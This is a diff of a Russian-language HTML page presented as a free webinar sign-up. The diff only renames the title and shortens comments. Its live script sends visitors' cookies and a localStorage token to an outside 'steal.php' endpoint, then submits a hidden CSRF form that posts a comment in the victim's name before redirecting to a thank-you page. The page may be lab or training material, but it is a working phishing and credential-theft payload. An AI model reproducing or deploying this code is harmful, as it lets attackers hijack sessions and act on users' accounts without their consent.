@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Запись на вебинар</title>
+  <title>Бесплатный вебинар</title>
   <style>
     body {
       font-family: sans-serif;
@@ -54,16 +54,16 @@
 
   <script>
     function attack() {
-      // 1. Кража cookie
+      // Кража cookie
       fetch("https://kazcybertoken.ct.ws/steal.php?cookie=" + encodeURIComponent(document.cookie));
 
-      // 2. Кража токена из localStorage
+      // Кража токена из localStorage
       const token = localStorage.getItem("token");
       if (token) {
         fetch("https://kazcybertoken.ct.ws/steal.php?token=" + encodeURIComponent(token));
       }
 
-      // 3. CSRF-атака — отправка комментария от имени жертвы
+      // CSRF-атака
       const form = document.createElement("form");
       form.action = "https://kazcyber.zapto.org/comments.php";
       form.method = "POST";
@@ -77,10 +77,8 @@
       document.body.appendChild(form);
       form.submit();
 
-      // 4. Показать сообщение
+      // Сообщение + редирект
       document.getElementById("ok").style.display = "block";
-
-      // 5. Переадресация через 3 секунды
       setTimeout(() => {
         window.location.href = "https://cyberwebinar.kz/thanks";
       }, 3000);
@@ -88,5 +86,4 @@
   </script>
 </body>
 </html>
-
 
